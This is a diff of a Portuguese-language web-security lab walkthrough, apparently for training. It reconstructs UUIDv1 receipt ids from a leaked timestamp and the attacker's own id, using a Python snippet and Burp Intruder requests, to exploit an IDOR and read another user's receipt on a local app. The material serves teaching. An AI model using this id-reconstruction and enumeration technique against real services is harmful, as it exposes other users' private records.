@@ -54,7 +54,7 @@ X-User-ID: mallory
 Content-Length: 0
 ```
 
-A response renderiza o seu recibo. O id dele é um **UUIDv1**:
+A response renderiza o seu recibo. O id dele é um **UUIDv1** (valores de exemplo — o seu vai diferir):
 
 ```
 Receipt id: 184dae7c-7ba1-11f1-b8a9-56b2c594786d
@@ -62,7 +62,7 @@ Issued at:  2026-07-09T14:18:45.289126+00:00
 Owner:      mallory
 ```
 
-Leia de volta pra confirmar que a feature funciona — `GET /receipt/184dae7c-7ba1-11f1-b8a9-56b2c594786d` com `X-User-ID: mallory` retorna 200 e o seu recibo. Guarde este id: ele é a sua amostra do gerador.
+Leia de volta pra confirmar que a feature funciona — `GET /receipt/<seu-id>` (o id que o seu próprio POST acabou de retornar) com `X-User-ID: mallory` retorna 200 e o seu recibo. Guarde este id: ele é a sua amostra do gerador.
 
 ### Passo 1 — Leia o metadado que a app vaza
 
@@ -89,8 +89,8 @@ Um UUIDv1 não é aleatório. Ele é `timestamp | clock_sequence | node`, e o Py
 
 ```python
 import uuid
-mine = uuid.UUID("184dae7c-7ba1-11f1-b8a9-56b2c594786d")
-print(hex(mine.node), mine.clock_seq)   # 0x56b2c594786d 14505
+mine = uuid.UUID("<id-do-seu-recibo>")   # o id do seu próprio POST (Baseline)
+print(hex(mine.node), mine.clock_seq)   # exemplo: 0x56b2c594786d 14505 — o seu vai diferir
 ```
 
 O `node` (aqui o MAC do container) e o `clock_seq` são **constantes de processo** — a app fixa os dois durante a vida do processo — então o id da alice carrega o *mesmo* `node` e `clock_seq` que o seu. Dá pra ver a olho nu: o seu id termina em `-b8a9-56b2c594786d`, e o dela também vai terminar. Só os campos de tempo diferem entre os dois.
@@ -99,7 +99,9 @@ O `node` (aqui o MAC do container) e o `clock_seq` são **constantes de processo
 
 ### Passo 3 — Reconstrua o UUID da vítima (~10 candidatos)
 
-Você sabe o `node` e o `clock_seq` da alice (Passo 2) e o `issued_at` dela ao microssegundo (Passo 1). Um timestamp v1 conta ticks de 100 nanossegundos, então um microssegundo são dez ticks: fixar o tempo ao microssegundo deixa exatamente um dígito desconhecido — **dez candidatos de UUID**. Reconstrua-os:
+Você sabe o `node` e o `clock_seq` da alice (Passo 2) e o `issued_at` dela ao microssegundo (Passo 1). Um timestamp v1 conta ticks de 100 nanossegundos, então um microssegundo são dez ticks: fixar o tempo ao microssegundo deixa exatamente um dígito desconhecido — **dez candidatos de UUID**.
+
+Você não construiria isso na mão durante um engagement. O movimento no campo é *reconhecer* o id como um UUID versão 1 — ler o version nibble, o dígito que abre o terceiro grupo (o `1` em `...-11f1-...`) — e apontar uma ferramenta pronta de UUIDv1 pra ele, tipo o [`guidtool`](https://github.com/intruder-io/guidtool): dá pra ela um id de amostra (o seu) e o `issued_at` aproximado do alvo, e ela enumera os candidatos pra você. O snippet abaixo é a mesma aritmética de empacotamento de campos que uma tool dessas roda por baixo, mostrada crua pra você entender *por que* um v1 é reconstruível — o hábito do projeto de trabalhar a mecânica na mão, como o `UNION` no `sqli-union-basic`:
 
 ```python
 import uuid
@@ -108,10 +110,10 @@ from datetime import datetime, timezone, timedelta
 UUID_EPOCH_100NS = 0x01b21dd213814000
 UNIX_EPOCH = datetime(1970, 1, 1, tzinfo=timezone.utc)
 
-mine = uuid.UUID("184dae7c-7ba1-11f1-b8a9-56b2c594786d")     # seu próprio recibo
+mine = uuid.UUID("<id-do-seu-recibo>")       # o id que o seu próprio POST retornou (Baseline)
 node, clock_seq = mine.node, mine.clock_seq                  # constantes de processo
 
-issued_at = datetime.fromisoformat("2026-07-09T14:16:02.668144+00:00")  # alice, do dashboard
+issued_at = datetime.fromisoformat("<issued_at-da-alice-no-seu-dashboard>")  # copie a linha da alice no GET /
 us = (issued_at - UNIX_EPOCH) // timedelta(microseconds=1)
 base = us * 10 + UUID_EPOCH_100NS
 
@@ -124,7 +126,7 @@ for d in range(10):
     print(build_v1(base + d, node, clock_seq))
 ```
 
-Saída — dez UUIDs que diferem só no último dígito de tempo:
+Saída de exemplo da sessão de validação — dez UUIDs que diferem só no último dígito de tempo (**a sua vai diferir**):
 
 ```
 b75fb060-7ba0-11f1-b8a9-56b2c594786d
@@ -137,32 +139,34 @@ Um deles é o id real do recibo da alice. (Nesta sessão foi o quinto, `...b75fb
 
 ### Passo 4 — Acesse o recibo da vítima (IDOR confirmado)
 
-Mande os dez candidatos no endpoint privado — Repeater, editando o último dígito a cada vez (ou jogue-os no Intruder como uma lista de dez payloads):
+Agora você tem dez candidatos e **não** sabe qual deles é o da alice — descobrir isso *é* o ataque, e o próprio servidor é o oráculo que responde. Você não compara hex nem inspeciona os ids; você manda os dez no endpoint privado e observa os status codes.
+
+O jeito limpo de disparar os dez de uma vez é o **Burp Intruder**: mande o request pra lá, marque o id no path como a única posição de payload (envolva ele nos marcadores `§` do Intruder — `GET /receipt/§...§`), escolha o ataque Sniper, cole os dez candidatos como uma payload list simples, e Start attack. (O Repeater também serve — edite o último dígito e reenvie, dez vezes.) Um request de candidato tem esta cara:
 
 ```
-GET /receipt/b75fb064-7ba0-11f1-b8a9-56b2c594786d HTTP/1.1
+GET /receipt/<candidato> HTTP/1.1
 Host: 127.0.0.1:8011
 X-User-ID: mallory
 ```
 
-Nove retornam **404**. Um retorna **200** — o recibo da alice:
+Ordene os resultados por status: nove ids não existem no store e voltam **404**; o único id real volta **200**. O status code é o único sinal que difere — você nunca comparou ids, só observou qual request abriu um recibo. Abra o 200 e você está olhando pro recibo da alice, um registro cujo link você nunca recebeu:
 
 ```
-Receipt id: b75fb064-7ba0-11f1-b8a9-56b2c594786d
+Receipt id: b75fb064-7ba0-11f1-b8a9-56b2c594786d   (exemplo — o seu vai diferir)
 Owner:      alice
 Item:       Noise-cancelling headphones
 Amount:     $1,299.00
 Issued at:  2026-07-09T14:16:02.668144+00:00
 ```
 
-Isso é o IDOR. Você leu o recibo de outra usuária sem nunca ter recebido o link — você reconstruiu o link a partir de um timestamp num dashboard e de um UUID seu. O `issued_at` no recibo retornado bate exatamente com a linha do dashboard, confirmando que você acertou o registro real da alice.
+Isso é o IDOR. Você leu o recibo de outra usuária sem nunca ter recebido o link — você reconstruiu os candidatos a partir de um timestamp num dashboard e de um UUID seu, e o próprio servidor te disse qual candidato era o real. O `issued_at` no 200 bate exatamente com a linha da alice no dashboard, confirmando que você acertou o registro dela.
 
 ### Passo 5 — Prove que o bug é "check ausente", não "id adivinhável"
 
 A reconstrução é dramática, mas pode te enganar a achar que o bug é "o UUID era adivinhável". Não é. Mantenha o path no **seu próprio** recibo — um id que você legitimamente possui — e mude só o header, dizendo que é a alice:
 
 ```
-GET /receipt/184dae7c-7ba1-11f1-b8a9-56b2c594786d HTTP/1.1
+GET /receipt/<seu-id> HTTP/1.1
 Host: 127.0.0.1:8011
 X-User-ID: alice
 ```
